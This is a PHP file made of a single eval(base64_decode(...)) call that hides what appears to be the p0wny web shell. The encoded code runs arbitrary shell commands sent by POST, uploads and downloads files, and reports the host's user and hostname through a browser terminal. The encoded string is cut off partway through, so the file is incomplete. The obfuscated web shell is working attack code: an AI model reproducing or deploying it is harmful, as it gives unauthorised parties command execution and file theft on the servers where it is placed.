<?php


eval(base64_decode("JFNIRUxMX0NPTkZJRyA9IGFycmF5KAogICAgJ3VzZXJuYW1lJyA9PiAncDB3bnknLAogICAgJ2hvc3RuYW1lJyA9PiAnc2hlbGwnLAopOwoKZnVuY3Rpb24gZXhwYW5kUGF0aCgkcGF0aCkgewogICAgaWYgKHByZWdfbWF0Y2goIiNeKH5bYS16QS1aMC05Xy4tXSopKC8uKik/JCMiLCAkcGF0aCwgJG1hdGNoKSkgewogICAgICAgIGV4ZWMoImVjaG8gJG1hdGNoWzFdIiwgJHN0ZG91dCk7CiAgICAgICAgcmV0dXJuICRzdGRvdXRbMF0gLiAkbWF0Y2hbMl07CiAgICB9CiAgICByZXR1cm4gJHBhdGg7Cn0KCmZ1bmN0aW9uIGFsbEZ1bmN0aW9uRXhpc3QoJGxpc3QgPSBhcnJheSgpKSB7CiAgICBmb3JlYWNoICgkbGlzdCBhcyAkZW50cnkpIHsKICAgICAgICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygkZW50cnkpKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gdHJ1ZTsKfQoKZnVuY3Rpb24gZXhlY3V0ZUNvbW1hbmQoJGNtZCkgewogICAgJG91dHB1dCA9ICcnOwogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKSB7CiAgICAgICAgZXhlYygkY21kLCAkb3V0cHV0KTsKICAgICAgICAkb3V0cHV0ID0gaW1wbG9kZSgiXG4iLCAkb3V0cHV0KTsKICAgIH0gZWxzZSBpZiAoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpIHsKICAgICAgICAkb3V0cHV0ID0gc2hlbGxfZXhlYygkY21kKTsKICAgIH0gZWxzZSBpZiAoYWxsRnVuY3Rpb25FeGlzdChhcnJheSgnc3lzdGVtJywgJ29iX3N0YXJ0JywgJ29iX2dldF9jb250ZW50cycsICdvYl9lbmRfY2xlYW4nKSkpIHsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIHN5c3RlbSgkY21kKTsKICAgICAgICAkb3V0cHV0ID0gb2JfZ2V0X2NvbnRlbnRzKCk7CiAgICAgICAgb2JfZW5kX2NsZWFuKCk7CiAgICB9IGVsc2UgaWYgKGFsbEZ1bmN0aW9uRXhpc3QoYXJyYXkoJ3Bhc3N0aHJ1JywgJ29iX3N0YXJ0JywgJ29iX2dldF9jb250ZW50cycsICdvYl9lbmRfY2xlYW4nKSkpIHsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIHBhc3N0aHJ1KCRjbWQpOwogICAgICAgICRvdXRwdXQgPSBvYl9nZXRfY29udGVudHMoKTsKICAgICAgICBvYl9lbmRfY2xlYW4oKTsKICAgIH0gZWxzZSBpZiAoYWxsRnVuY3Rpb25FeGlzdChhcnJheSgncG9wZW4nLCAnZmVvZicsICdmcmVhZCcsICdwY2xvc2UnKSkpIHsKICAgICAgICAkaGFuZGxlID0gcG9wZW4oJGNtZCwgJ3InKTsKICAgICAgICB3aGlsZSAoIWZlb2YoJGhhbmRsZSkpIHsKICAgICAgICAgICAgJG91dHB1dCAuPSBmcmVhZCgkaGFuZGxlLCA0MDk2KTsKICAgICAgICB9CiAgICAgICAgcGNsb3NlKCRoYW5kbGUpOwogICAgfSBlbHNlIGlmIChhbGxGdW5jdGlvbkV4aXN0KGFycmF5KCdwcm9jX29wZW4nLCAnc3RyZWFtX2dldF9jb250ZW50cycsICdwcm9jX2Nsb3NlJykpKSB7CiAgICAgICAgJGhhbmRsZSA9IHByb2Nfb3BlbigkY21kLCBhcnJheSgwID0+IGFycmF5KCdwaXBlJywgJ3InKSwgMSA9PiBhcnJheSgncGlwZScsICd3JykpLCAkcGlwZXMpOwogICAgICAgICRvdXRwdXQgPSBzdHJlYW1fZ2V0X2NvbnRlbnRzKCRwaXBlc1sxXSk7CiAgICAgICAgcHJvY19jbG9zZSgkaGFuZGxlKTsKICAgIH0KICAgIHJldHVybiAkb3V0cHV0Owp9CgpmdW5jdGlvbiBpc1J1bm5pbmdXaW5kb3dzKCkgewogICAgcmV0dXJuIHN0cmlwb3MoUEhQX09TLCAiV0lOIikgPT09IDA7Cn0KCmZ1bmN0aW9uIGZlYXR1cmVTaGVsbCgkY21kLCAkY3dkKSB7CiAgICAkc3Rkb3V0ID0gIiI7CgogICAgaWYgKHByZWdfbWF0Y2goIi9eXHMqY2RccyooMj4mMSk/JC8iLCAkY21kKSkgewogICAgICAgIGNoZGlyKGV4cGFuZFBhdGgoIn4iKSk7CiAgICB9IGVsc2VpZiAocHJlZ19tYXRjaCgiL15ccypjZFxzKyguKylccyooMj4mMSk/JC8iLCAkY21kKSkgewogICAgICAgIGNoZGlyKCRjd2QpOwogICAgICAgIHByZWdfbWF0Y2goIi9eXHMqY2RccysoW15cc10rKVxzKigyPiYxKT8kLyIsICRjbWQsICRtYXRjaCk7CiAgICAgICAgY2hkaXIoZXhwYW5kUGF0aCgkbWF0Y2hbMV0pKTsKICAgIH0gZWxzZWlmIChwcmVnX21hdGNoKCIvXlxzKmRvd25sb2FkXHMrW15cc10rXHMqKDI+JjEpPyQvIiwgJGNtZCkpIHsKICAgICAgICBjaGRpcigkY3dkKTsKICAgICAgICBwcmVnX21hdGNoKCIvXlxzKmRvd25sb2FkXHMrKFteXHNdKylccyooMj4mMSk/JC8iLCAkY21kLCAkbWF0Y2gpOwogICAgICAgIHJldHVybiBmZWF0dXJlRG93bmxvYWQoJG1hdGNoWzFdKTsKICAgIH0gZWxzZSB7CiAgICAgICAgY2hkaXIoJGN3ZCk7CiAgICAgICAgJHN0ZG91dCA9IGV4ZWN1dGVDb21tYW5kKCRjbWQpOwogICAgfQoKICAgIHJldHVybiBhcnJheSgKICAgICAgICAic3Rkb3V0IiA9PiBiYXNlNjRfZW5jb2RlKCRzdGRvdXQpLAogICAgICAgICJjd2QiID0+IGJhc2U2NF9lbmNvZGUoZ2V0Y3dkKCkpCiAgICApOwp9CgpmdW5jdGlvbiBmZWF0dXJlUHdkKCkgewogICAgcmV0dXJuIGFycmF5KCJjd2QiID0+IGJhc2U2NF9lbmNvZGUoZ2V0Y3dkKCkpKTsKfQoKZnVuY3Rpb24gZmVhdHVyZUhpbnQoJGZpbGVOYW1lLCAkY3dkLCAkdHlwZSkgewogICAgY2hkaXIoJGN3ZCk7CiAgICBpZiAoJHR5cGUgPT0gJ2NtZCcpIHsKICAgICAgICAkY21kID0gImNvbXBnZW4gLWMgJGZpbGVOYW1lIjsKICAgIH0gZWxzZSB7CiAgICAgICAgJGNtZCA9ICJjb21wZ2VuIC1mICRmaWxlTmFtZSI7CiAgICB9CiAgICAkY21kID0gIi9iaW4vYmFzaCAtYyBcIiRjbWRcIiI7CiAgICAkZmlsZXMgPSBleHBsb2RlKCJcbiIsIHNoZWxsX2V4ZWMoJGNtZCkpOwogICAgZm9yZWFjaCAoJGZpbGVzIGFzICYkZmlsZW5hbWUpIHsKICAgICAgICAkZmlsZW5hbWUgPSBiYXNlNjRfZW5jb2RlKCRmaWxlbmFtZSk7CiAgICB9CiAgICByZXR1cm4gYXJyYXkoCiAgICAgICAgJ2ZpbGVzJyA9PiAkZmlsZXMsCiAgICApOwp9CgpmdW5jdGlvbiBmZWF0dXJlRG93bmxvYWQoJGZpbGVQYXRoKSB7CiAgICAkZmlsZSA9IEBmaWxlX2dldF9jb250ZW50cygkZmlsZVBhdGgpOwogICAgaWYgKCRmaWxlID09PSBGQUxTRSkgewogICAgICAgIHJldHVybiBhcnJheSgKICAgICAgICAgICAgJ3N0ZG91dCcgPT4gYmFzZTY0X2VuY29kZSgnRmlsZSBub3QgZm91bmQgLyBubyByZWFkIHBlcm1pc3Npb24uJyksCiAgICAgICAgICAgICdjd2QnID0+IGJhc2U2NF9lbmNvZGUoZ2V0Y3dkKCkpCiAgICAgICAgKTsKICAgIH0gZWxzZSB7CiAgICAgICAgcmV0dXJuIGFycmF5KAogICAgICAgICAgICAnbmFtZScgPT4gYmFzZTY0X2VuY29kZShiYXNlbmFtZSgkZmlsZVBhdGgpKSwKICAgICAgICAgICAgJ2ZpbGUnID0+IGJhc2U2NF9lbmNvZGUoJGZpbGUpCiAgICAgICAgKTsKICAgIH0KfQoKZnVuY3Rpb24gZmVhdHVyZVVwbG9hZCgkcGF0aCwgJGZpbGUsICRjd2QpIHsKICAgIGNoZGlyKCRjd2QpOwogICAgJGYgPSBAZm9wZW4oJHBhdGgsICd3YicpOwogICAgaWYgKCRmID09PSBGQUxTRSkgewogICAgICAgIHJldHVybiBhcnJheSgKICAgICAgICAgICAgJ3N0ZG91dCcgPT4gYmFzZTY0X2VuY29kZSgnSW52YWxpZCBwYXRoIC8gbm8gd3JpdGUgcGVybWlzc2lvbi4nKSwKICAgICAgICAgICAgJ2N3ZCcgPT4gYmFzZTY0X2VuY29kZShnZXRjd2QoKSkKICAgICAgICApOwogICAgfSBlbHNlIHsKICAgICAgICBmd3JpdGUoJGYsIGJhc2U2NF9kZWNvZGUoJGZpbGUpKTsKICAgICAgICBmY2xvc2UoJGYpOwogICAgICAgIHJldHVybiBhcnJheSgKICAgICAgICAgICAgJ3N0ZG91dCcgPT4gYmFzZTY0X2VuY29kZSgnRG9uZS4nKSwKICAgICAgICAgICAgJ2N3ZCcgPT4gYmFzZTY0X2VuY29kZShnZXRjd2QoKSkKICAgICAgICApOwogICAgfQp9CgpmdW5jdGlvbiBpbml0U2hlbGxDb25maWcoKSB7CiAgICBnbG9iYWwgJFNIRUxMX0NPTkZJRzsKCiAgICBpZiAoaXNSdW5uaW5nV2luZG93cygpKSB7CiAgICAgICAgJHVzZXJuYW1lID0gZ2V0ZW52KCdVU0VSTkFNRScpOwogICAgICAgIGlmICgkdXNlcm5hbWUgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICRTSEVMTF9DT05GSUdbJ3VzZXJuYW1lJ10gPSAkdXNlcm5hbWU7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICAkcHd1aWQgPSBwb3NpeF9nZXRwd3VpZChwb3NpeF9nZXRldWlkKCkpOwogICAgICAgIGlmICgkcHd1aWQgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICRTSEVMTF9DT05GSUdbJ3VzZXJuYW1lJ10gPSAkcHd1aWRbJ25hbWUnXTsKICAgICAgICB9CiAgICB9CgogICAgJGhvc3RuYW1lID0gZ2V0aG9zdG5hbWUoKTsKICAgIGlmICgkaG9zdG5hbWUgIT09IGZhbHNlKSB7CiAgICAgICAgJFNIRUxMX0NPTkZJR1snaG9zdG5hbWUnXSA9ICRob3N0bmFtZTsKICAgIH0KfQoKaWYgKGlzc2V0KCRfR0VUWyJmZWF0dXJlIl0pKSB7CgogICAgJHJlc3BvbnNlID0gTlVMTDsKCiAgICBzd2l0Y2ggKCRfR0VUWyJmZWF0dXJlIl0pIHsKICAgICAgICBjYXNlICJzaGVsbCI6CiAgICAgICAgICAgICRjbWQgPSAkX1BPU1RbJ2NtZCddOwogICAgICAgICAgICBpZiAoIXByZWdfbWF0Y2goJy8yPi8nLCAkY21kKSkgewogICAgICAgICAgICAgICAgJGNtZCAuPSAnIDI+JjEnOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRyZXNwb25zZSA9IGZlYXR1cmVTaGVsbCgkY21kLCAkX1BPU1RbImN3ZCJdKTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAicHdkIjoKICAgICAgICAgICAgJHJlc3BvbnNlID0gZmVhdHVyZVB3ZCgpOwogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlICJoaW50IjoKICAgICAgICAgICAgJHJlc3BvbnNlID0gZmVhdHVyZUhpbnQoJF9QT1NUWydmaWxlbmFtZSddLCAkX1BPU1RbJ2N3ZCddLCAkX1BPU1RbJ3R5cGUnXSk7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UgJ3VwbG9hZCc6CiAgICAgICAgICAgICRyZXNwb25zZSA9IGZlYXR1cmVVcGxvYWQoJF9QT1NUWydwYXRoJ10sICRfUE9TVFsnZmlsZSddLCAkX1BPU1RbJ2N3ZCddKTsKICAgIH0KCiAgICBoZWFkZXIoIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbiIpOwogICAgZWNobyBqc29uX2VuY29kZSgkcmVzcG9uc2UpOwogICAgZGllKCk7Cn0gZWxzZSB7CiAgICBpbml0U2hlbGxDb25maWcoKTsKfQoKPz48IURPQ1RZUEUgaHRtbD4KCjxodG1sPgoKICAgIDxoZWFkPgogICAgICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04IiAvPgogICAgICAgIDx0aXRsZT5wMHdueUBzaGVsbDp+IzwvdGl0bGU+CiAgICAgICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiIC8+CiAgICAgICAgPHN0eWxlPgogICAgICAgICAgICBodG1sLCBib2R5IHsKICAgICAgICAgICAgICAgIG1hcmdpbjogMDsKICAgICAgICAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMzMzOwogICAgICAgICAgICAgICAgY29sb3I6ICNlZWU7CiAgICAgICAgICAgICAgICBmb250LWZhbWlseTogbW9ub3NwYWNlOwogICAgICAgICAgICAgICAgd2lkdGg6IDEwMHZ3OwogICAgICAgICAgICAgICAgaGVpZ2h0OiAxMDB2aDsKICAgICAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICo6Oi13ZWJraXQtc2Nyb2xsYmFyLXRyYWNrIHsKICAgICAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDhweDsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMzNTM1MzU7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICo6Oi13ZWJraXQtc2Nyb2xsYmFyIHsKICAgICAgICAgICAgICAgIHdpZHRoOiA4cHg7CiAgICAgICAgICAgICAgICBoZWlnaHQ6IDhweDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgKjo6LXdlYmtpdC1zY3JvbGxiYXItdGh1bWIgewogICAgICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICAgICAgICAgICAgLXdlYmtpdC1ib3gtc2hhZG93OiBpbnNldCAwIDAgNnB4IHJnYmEoMCwwLDAsLjMpOwogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2JjYmNiYzsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgI3NoZWxsIHsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMyMjI7CiAgICAgICAgICAgICAgICBib3gtc2hhZG93OiAwIDAgNXB4IHJnYmEoMCwgMCwgMCwgLjMpOwogICAgICAgICAgICAgICAgZm9udC1zaXplOiAxMHB0OwogICAgICAgICAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICAgICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgICAgICAgICAgICBhbGlnbi1pdGVtczogc3RyZXRjaDsKICAgICAgICAgICAgICAgIG1heC13aWR0aDogY2FsYygxMDB2dyAtIDIgKiB2YXIoLS1zaGVsbC1tYXJnaW4pKTsKICAgICAgICAgICAgICAgIG1heC1oZWlnaHQ6IGNhbGMoMTAwdmggLSAyICogdmFyKC0tc2hlbGwtbWFyZ2luKSk7CiAgICAgICAgICAgICAgICByZXNpemU6IGJvdGg7CiAgICAgICAgICAgICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgICAgICAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgICAgICAgICBoZWlnaHQ6IDEwMCU7CiAgICAgICAgICAgICAgICBtYXJnaW46IHZhcigtLXNoZWxsLW1hcmdpbikgYXV0bzsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgI3NoZWxsLWNvbnRlbnQgewogICAgICAgICAgICAgICAgb3ZlcmZsb3c6IGF1dG87CiAgICAgICAgICAgICAgICBwYWRkaW5nOiA1cHg7CiAgICAgICAgICAgICAgICB3aGl0ZS1zcGFjZTogcHJlLXdyYXA7CiAgICAgICAgICAgICAgICBmbGV4LWdyb3c6IDE7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICNzaGVsbC1sb2dvIHsKICAgICAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgICAgICAgICAgY29sb3I6ICNGRjQxODA7CiAgICAgICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIDpyb290IHsKICAgICAgICAgICAgICAgIC0tc2hlbGwtbWFyZ2luOiAyNXB4OwogICAgICAgICAgICB9CgogICAgICAgICAgICBAbWVkaWEgKG1pbi13aWR0aDogMTIwMHB4KSB7CiAgICAgICAgICAgICAgICA6cm9vdCB7CiAgICAgICAgICAgICAgICAgICAgLS1zaGVsbC1tYXJnaW46IDUwcHggIWltcG9ydGFudDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgQG1lZGlhIChtYXgtd2lkdGg6IDk5MXB4KSwKICAgICAgICAgICAgICAgICAgIChtYXgtaGVpZ2h0OiA2MDBweCkgewogICAgICAgICAgICAgICAgI3NoZWxsLWxvZ28gewogICAgICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogNnB4OwogICAgICAgICAgICAgICAgICAgIG1hcmdpbjogLTI1cHggMDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIDpyb290IHsKICAgICAgICAgICAgICAgICAgICAtLXNoZWxsLW1hcmdpbjogMCAhaW1wb3J0YW50OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgI3NoZWxsIHsKICAgICAgICAgICAgICAgICAgICByZXNpemU6IG5vbmU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIEBtZWRpYSAobWF4LXdpZHRoOiA3NjdweCkgewogICAgICAgICAgICAgICAgI3NoZWxsLWlucHV0IHsKICAgICAgICAgICAgICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBAbWVkaWEgKG1heC13aWR0aDogMzIwcHgpIHsKICAgICAgICAgICAgICAgICNzaGVsbC1sb2dvIHsKICAgICAgICAgICAgICAgICAgICBmb250LXNpemU6IDVweDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgLnNoZWxsLXByb21wdCB7CiAgICAgICAgICAgICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgICAgICAgICAgIGNvbG9yOiAjNzVERjBCOwogICAgICAgICAgICB9CgogICAgICAgICAgICAuc2hlbGwtcHJvbXB0ID4gc3BhbiB7CiAgICAgICAgICAgICAgICBjb2xvcjogIzFCQzlFNzsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgI3NoZWxsLWlucHV0IHsKICAgICAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgICAgICAgICAgICBib3gtc2hhZG93OiAwIC0xcHggMCByZ2JhKDAsIDAsIDAsIC4zKTsKICAgICAgICAgICAgICAgIGJvcmRlci10b3A6IHJnYmEoMjU1LCAyNTUsIDI1NSwgLjA1KSBzb2xpZCAxcHg7CiAgICAgICAgICAgICAgICBwYWRkaW5nOiAxMHB4IDA7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICNzaGVsbC1pbnB1dCA+IGxhYmVsIHsKICAgICAgICAgICAgICAgIGZsZXgtZ3JvdzogMDsKICAgICAgICAgICAgICAgIGRpc3BsYXk6IGJsb2NrOwogICAgICAgICAgICAgICAgcGFkZGluZzogMCA1cHg7CiAgICAgICAgICAgICAgICBoZWlnaHQ6IDMwcHg7CiAgICAgICAgICAgICAgICBsaW5lLWhlaWdodDogMzBweDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgI3NoZWxsLWlucHV0ICNzaGVsbC1jbWQgewogICAgICAgICAgICAgICAgaGVpZ2h0OiAzMHB4OwogICAgICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDMwcHg7CiAgICAgICAgICAgICAgICBib3JkZXI6IG5vbmU7CiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsKICAgICAgICAgICAgICAgIGNvbG9yOiAjZWVlOwogICAgICAgICAgICAgICAgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsKICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMTBwdDsKICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICAgICAgYWxpZ24tc2VsZjogY2VudGVyOwogICAgICAgICAgICAgICAgYm94LXNpemluZzogYm9yZGVyLWJveDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgI3NoZWxsLWlucHV0IGRpdiB7CiAgICAgICAgICAgICAgICBmbGV4LWdyb3c6IDE7CiAgICAgICAgICAgICAgICBhbGlnbi1pdGVtczogc3RyZXRjaDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgI3NoZWxsLWlucHV0IGlucHV0IHsKICAgICAgICAgICAgICAgIG91dGxpbmU6IG5vbmU7CiAgICAgICAgICAgIH0KICAgICAgICA8L3N0eWxlPgoKICAgICAgICA8c2NyaXB0PgogICAgICAgICAgICB2YXIgU0hFTExfQ09ORklHID0gPD9waHAgZWNobyBqc29uX2VuY29kZSgkU0hFTExfQ09ORklHKTsgPz47CiAgICAgICAgICAgIHZhciBDV0QgPSBudWxsOwogICAgICAgICAgICB2YXIgY29tbWFuZEhpc3RvcnkgPSBbXTsKICAgICAgICAgICAgdmFyIGhpc3RvcnlQb3NpdGlvbiA9IDA7CiAgICAgICAgICAgIHZhciBlU2hlbGxDbWRJbnB1dCA9IG51bGw7CiAgICAgICAgICAgIHZhciBlU2hlbGxDb250ZW50ID0gbnVsbDsKCiAgICAgICAgICAgIGZ1bmN0aW9uIF9pbnNlcnRDb21tYW5kKGNvbW1hbmQpIHsKICAgICAgICAgICAgICAgIGVTaGVsbENvbnRlbnQuaW5uZXJIVE1MICs9ICJcblxuIjsKICAgICAgICAgICAgICAgIGVTaGVsbENvbnRlbnQuaW5uZXJIVE1MICs9ICc8c3BhbiBjbGFzcz1cInNoZWxsLXByb21wdFwiPicgKyBnZW5Qcm9tcHQoQ1dEKSArICc8L3NwYW4+ICc7CiAgICAgICAgICAgICAgICBlU2hlbGxDb250ZW50LmlubmVySFRNTCArPSBlc2NhcGVIdG1sKGNvbW1hbmQpOwogICAgICAgICAgICAgICAgZVNoZWxsQ29udGVudC5pbm5lckhUTUwgKz0gIlxuIjsKICAgICAgICAgICAgICAgIGVTaGVsbENvbnRlbnQuc2Nyb2xsVG9wID0gZVNoZWxsQ29udGVudC5zY3JvbGxIZWlnaHQ7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIF9pbnNlcnRTdGRvdXQoc3Rkb3V0KSB7CiAgICAgICAgICAgICAgICBlU2hlbGxDb250ZW50LmlubmVySFRNTCArPSBlc2NhcGVIdG1sKHN0ZG91dCk7CiAgICAgICAgICAgICAgICBlU2hlbGxDb250ZW50LnNjcm9sbFRvcCA9IGVTaGVsbENvbnRlbnQuc2Nyb2xsSGVpZ2h0OwogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBfZGVmZXIoY2FsbGJhY2spIHsKICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoY2FsbGJhY2ssIDApOwogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBmZWF0dXJlU2hlbGwoY29tbWFuZCkgewoKICAgICAgICAgICAgICAgIF9pbnNlcnRDb21tYW5kKGNvbW1hbmQpOwogICAgICAgICAgICAgICAgaWYgKC9eXHMqdXBsb2FkXHMrW15cc10rXHMqJC8udGVzdChjb21tYW5kKSkgewogICAgICAgICAgICAgICAgICAgIGZlYXR1cmVVcGxvYWQoY29tbWFuZC5tYXRjaCgvXlxzKnVwbG9hZFxzKyhbXlxzXSspXHMqJC8pWzFdKTsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoL15ccypjbGVhclxzKiQvLnRlc3QoY29tbWFuZCkpIHsKICAgICAgICAgICAgICAgICAgICAvLyBCYWNrZW5kIHNoZWxsIFRFUk0gZW52aXJvbm1lbnQgdmFyaWFibGUgbm90IHNldC4gQ2xlYXIgY29tbWFuZCBoaXN0b3J5IGZyb20gVUkgYnV0IGtlZXAgaW4gYnVmZmVyCiAgICAgICAgICAgICAgICAgICAgZVNoZWxsQ29udGVudC5pbm5lckhUTUwgPSAnJzsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgbWFrZVJlcXVlc3QoIj9mZWF0dXJlPXNoZWxsIiwge2NtZDogY29tbWFuZCwgY3dkOiBDV0R9LCBmdW5jdGlvbiAocmVzcG9uc2UpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLmhhc093blByb3BlcnR5KCdmaWxlJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZlYXR1cmVEb3dubG9hZChhdG9iKHJlc3BvbnNlLm5hbWUpLCByZXNwb25zZS5maWxlKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX2luc2VydFN0ZG91dChhdG9iKHJlc3BvbnNlLnN0ZG91dCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlQ3dkKGF0b2IocmVzcG9uc2UuY3dkKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gZmVhdHVyZUhpbnQoKSB7CiAgICAgICAgICAgICAgICBpZiAoZVNoZWxsQ21kSW5wdXQudmFsdWUudHJpbSgpLmxlbmd0aCA9PT0gMCkgcmV0dXJuOyAgLy8gZmllbGQgaXMgZW1wdHkgLT4gbm90aGluZyB0byBjb21wbGV0ZQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIF9yZXF1ZXN0Q2FsbGJhY2soZGF0YSkgewogICAgICAgICAgICAgICAgICAgIGlmIChkYXRhLmZpbGVzLmxlbmd0aCA8PSAxKSByZXR1cm47ICAvLyBubyBjb21wbGV0aW9uCiAgICAgICAgICAgICAgICAgICAgZGF0YS5maWxlcyA9IGRhdGEuZmlsZXMubWFwKGZ1bmN0aW9uKGZpbGUpewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYXRvYihmaWxlKTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICBpZiAoZGF0YS5maWxlcy5sZW5ndGggPT09IDIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHR5cGUgPT09ICdjbWQnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlU2hlbGxDbWRJbnB1dC52YWx1ZSA9IGRhdGEuZmlsZXNbMF07CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY3VycmVudFZhbHVlID0gZVNoZWxsQ21kSW5wdXQudmFsdWU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlU2hlbGxDbWRJbnB1dC52YWx1ZSA9IGN1cnJlbnRWYWx1ZS5yZXBsYWNlKC8oW15cc10qKSQvLCBkYXRhLmZpbGVzWzBdKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIF9pbnNlcnRDb21tYW5kKGVTaGVsbENtZElucHV0LnZhbHVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgX2luc2VydFN0ZG91dChkYXRhLmZpbGVzLmpvaW4oIlxuIikpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB2YXIgY3VycmVudENtZCA9IGVTaGVsbENtZElucHV0LnZhbHVlLnNwbGl0KCIgIik7CiAgICAgICAgICAgICAgICB2YXIgdHlwZSA9IChjdXJyZW50Q21kLmxlbmd0aCA9PT0gMSkgPyAiY21kIiA6ICJmaWxlIjsKICAgICAgICAgICAgICAgIHZhciBmaWxlTmFtZSA9ICh0eXBlID09PSAiY21kIikgPyBjdXJyZW50Q21kWzBdIDogY3VycmVudENtZFtjdXJyZW50Q21kLmxlbmd0aCAtIDFdOwoKICAgICAgICAgICAgICAgIG1ha2VSZXF1ZXN0KAogICAgICAgICAgICAgICAgICAgICI/ZmVhdHVyZT1oaW50IiwKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVuYW1lOiBmaWxlTmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgY3dkOiBDV0QsCiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6IHR5cGUKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIF9yZXF1ZXN0Q2FsbGJhY2sKICAgICAgICAgICAgICAgICk7CgogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBmZWF0dXJlRG93bmxvYWQobmFtZSwgZmlsZSkgewogICAgICAgICAgICAgICAgdmFyIGVsZW1lbnQgP